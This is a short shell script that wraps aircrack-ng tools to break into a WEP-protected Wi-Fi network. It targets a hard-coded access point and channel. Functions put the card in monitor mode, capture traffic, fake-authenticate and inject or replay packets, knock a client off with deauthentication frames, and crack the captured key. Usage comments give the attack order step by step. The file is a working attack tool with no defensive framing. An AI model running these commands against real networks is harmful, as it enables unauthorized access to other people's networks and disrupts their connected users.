#!/bin/sh

#
# usage:
#     1. start -> check: got CH and BSSID
#     2. dump
#     3. fakeauth + inject (CLIENT is wlan0's mac addr or 00:00:00:00:00:00)
#       or
#        replay  (CLIENT is wlan0's mac addr or 00:00:00:00:00:00)
#       or (if MAC filtering is on)
#        deauth + replay (CLIENT is selected station's mac addr)
#     4. crack
#     5. stop
CH=6
BSSID=00:1A:70:F3:DF:D7
CLIENT=00:00:00:00:00:00

start () {
    stop
    airmon-ng start wlan0
}

check () {
    airodump-ng mon0
}

dump () {
    airodump-ng --channel $CH --bssid $BSSID -w dumpfile mon0
}

replay () {
    aireplay-ng -3 -b $BSSID -h $CLIENT mon0
}

deauth () {
    aireplay-ng -0 5 -a $BSSID -c $CLIENT mon0
}

fakeauth () {
    aireplay-ng -1 0 -a $BSSID -h $CLIENT mon0
}

inject () {
    aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b $BSSID -h $CLIENT mon0
}

crack () {
    aircrack-ng dumpfile*.cap
}

stop () {
    airmon-ng stop mon0
    airmon-ng stop wlan0
}

[ -n "$1" ] && "$@"

